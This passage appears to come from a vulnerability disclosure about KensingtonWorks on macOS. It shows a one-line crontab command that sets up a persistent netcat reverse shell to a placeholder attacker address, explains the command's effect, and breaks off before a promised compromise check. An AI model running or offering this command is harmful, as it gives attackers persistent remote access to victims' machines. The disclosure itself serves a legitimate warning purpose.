...
`crontab -l | { cat; echo "*/5 * * * * nc -e /bin/sh ATTACKER.IP.ADDR.ESS 1234"; } | crontab -`

This command creates a cronjob that causes a victim's computer to repeatedly phone home to a server controlled by an attacker. It opens a "reverse shell", giving the attacker peristent access to execute further arbitrary commands, sniff round the victim's machine, and (for example) download their entire hard drive.
...
I've tested this vulnerability on the latest OSX 2.1.19 version of KensingtonWorks, and I think it's safe to assume that the Windows version is affected too. I do think that it's unlikely that you have been compromised already, but one way of checking (on OSX) is to run:
